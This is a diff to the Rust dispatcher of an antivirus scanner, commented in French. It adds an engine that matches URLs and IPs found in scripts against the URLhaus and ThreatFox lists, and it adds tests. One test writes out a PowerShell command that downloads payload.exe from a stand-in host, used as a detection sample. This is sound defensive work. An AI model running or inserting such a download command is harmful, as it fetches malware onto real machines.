@@ -1,8 +1,16 @@
 //! dispatcher — routage des cibles vers les moteurs pertinents (feuille de route §1).
 //!
-//! Chaque fichier ne passe que par les moteurs applicables :
-//!   PDF/Office → YARA → ClamAV → Heuristique → Corrélation
-//!   PE         → ClamAV → Heuristique(PE) → YARA → Corrélation
+//! Pipeline de détection (conforme au document de recherche optiCOMBAT) :
+//!
+//! ```text
+//! Fichier → SHA-256 → base de hachage (reputation / MalwareBazaar)
+//!         → extraction / archives → ClamAV
+//!         → règles YARA locales
+//!         → heuristique PE / ML
+//!         → IOC URL/domaine/IP (ioc-engine : URLhaus + ThreatFox)
+//!         → verdict + score de confiance
+//! ```
+//!
 //! Le dispatcher ne contient AUCUNE logique de détection : il orchestre.
 
 use std::io::{Cursor, Read};
@@ -15,6 +23,8 @@ use engine_core::{
 };
 use heuristics::HeuristicEngine;
 use ml_classifier::Classifier;
+use ioc_engine::extractor::{extract_from_text, is_likely_text};
+use ioc_engine::{IocEngine, IocSource};
 use reputation::{Reputation, ReputationEngine};
 use sandbox::Sandbox;
 use yara_engine::YaraEngine;
@@ -59,6 +69,8 @@ pub struct Dispatcher {
     sandbox: Sandbox,
     ml: Classifier,
     reputation: ReputationEngine,
+    /// Moteur IOC réseau (URLhaus + ThreatFox) — vide si aucune liste n'est disponible.
+    ioc: IocEngine,
 }
 
 impl Dispatcher {
@@ -72,6 +84,19 @@ impl Dispatcher {
         self.clam.clamd_available()
     }
 
+    /// Construit un dispatcher avec une source de réputation ET un moteur IOC.
+    pub fn with_ioc(reputation: ReputationEngine, ioc: IocEngine) -> Self {
+        Self {
+            clam: CompositeClamAvBackend::new(),
+            yara: YaraEngine::new(),
+            heur: HeuristicEngine::new(),
+            sandbox: Sandbox::new(),
+            ml: Classifier::new(),
+            ioc,
+            reputation,
+        }
+    }
+
     pub fn with_reputation(reputation: ReputationEngine) -> Self {
         Self {
             clam: CompositeClamAvBackend::new(),
@@ -79,6 +104,7 @@ impl Dispatcher {
             heur: HeuristicEngine::new(),
             sandbox: Sandbox::new(),
             ml: Classifier::new(),
+            ioc: IocEngine::empty(),
             reputation,
         }
     }
@@ -165,6 +191,21 @@ impl Dispatcher {
         if self.ml.applicable(&ctx) {
             if let Ok(r) = self.ml.scan(&ctx) {
                 results.push(r);
+            }
+        }
+        // 6) IOC réseau — extraction d'URLs/IPs depuis scripts et fichiers texte.
+        //    Couche 3 du pipeline défini dans le document de recherche optiCOMBAT :
+        //    URLhaus (distribution de malwares) + ThreatFox (IOC communautaires).
+        //    Activé uniquement si au moins un feed est chargé (is_empty = false).
+        if !self.ioc.is_empty() && matches!(kind, FileKind::Script | FileKind::Unknown) {
+            if is_likely_text(data) {
+                if let Ok(text) = std::str::from_utf8(data) {
+                    let indicators = extract_from_text(text);
+                    let hits = self.ioc.check_all(&indicators);
+                    if !hits.is_empty() {
+                        results.push(ioc_engine_result(&hits));
+                    }
+                }
             }
         }
         results
@@ -327,6 +368,42 @@ fn reputation_result(
     }
 }
 
+/// Convertit une liste de correspondances IOC en un `EngineResult` pour le corrélateur.
+fn ioc_engine_result(hits: &[ioc_engine::IocMatch]) -> EngineResult {
+    use std::time::Instant;
+    let t = Instant::now();
+    let detections = hits
+        .iter()
+        .map(|h| {
+            let source_label = match h.source {
+                IocSource::Urlhaus => "URLhaus",
+                IocSource::Threatfox => "ThreatFox",
+            };
+            Detection {
+                engine: "ioc".into(),
+                name: format!("IOC.{source_label}"),
+                score: h.confidence as i32,
+                severity: Severity::High,
+                explanation: format!(
+                    "[{source_label}] {:?} «{}» — confiance {}%",
+                    h.kind, h.ioc, h.confidence
+                ),
+            }
+        })
+        .collect::<Vec<_>>();
+    let verdict = if detections.iter().any(|d| d.score >= 75) {
+        Verdict::Malicious
+    } else {
+        Verdict::Suspicious
+    };
+    EngineResult {
+        engine: "ioc".into(),
+        verdict,
+        detections,
+        elapsed_ms: t.elapsed().as_millis(),
+    }
+}
+
 impl Default for Dispatcher {
     fn default() -> Self {
         Self::new()
@@ -337,6 +414,7 @@ impl Default for Dispatcher {
 mod tests {
     use super::*;
     use engine_core::Verdict;
+    use ioc_engine::IocEngine;
     use std::io::Write;
 
     fn tmp(data: &[u8], ext: &str) -> std::path::PathBuf {
@@ -404,5 +482,41 @@ mod tests {
             FileKind::PortableExecutable
         );
         assert_eq!(detect_kind(b"%PDF-1.7", Path::new("a.pdf")), FileKind::Pdf);
+    }
+
+    #[test]
+    fn ioc_engine_detecte_url_urlhaus() {
+        use ioc_engine::{IocEngine, IocFeed};
+        use ioc_engine::urlhaus::UrlhausFeed;
+
+        // Feed URLhaus avec une URL de test
+        let mut feed = UrlhausFeed::new();
+        feed.load_text("http://malware.example.com/payload.exe\n");
+        let ioc = IocEngine::new(vec![Box::new(feed)]);
+
+        let script = b"powershell -c (New-Object Net.WebClient).DownloadFile('http://malware.example.com/payload.exe','x.exe')";
+        let p = tmp(script, "ps1");
+        let d = Dispatcher::with_ioc(ReputationEngine::from_env(), ioc)
+            .scan_path(&p)
+            .unwrap();
+        // L'URL est connue → au moins Suspicious ou Malicious
+        assert!(
+            d.verdict == Verdict::Suspicious || d.verdict == Verdict::Malicious,
+            "attendu Suspicious/Malicious, obtenu {:?}",
+            d.verdict
+        );
+        let _ = std::fs::remove_file(p);
+    }
+
+    #[test]
+    fn ioc_engine_vide_ne_change_pas_verdict() {
+        // Sans feed IOC chargé, le script propre reste Clean.
+        let script = b"Write-Host 'hello world'";
+        let p = tmp(script, "ps1");
+        let d = Dispatcher::with_ioc(ReputationEngine::from_env(), IocEngine::empty())
+            .scan_path(&p)
+            .unwrap();
+        assert_eq!(d.verdict, Verdict::Clean);
+        let _ = std::fs::remove_file(p);
     }
 }
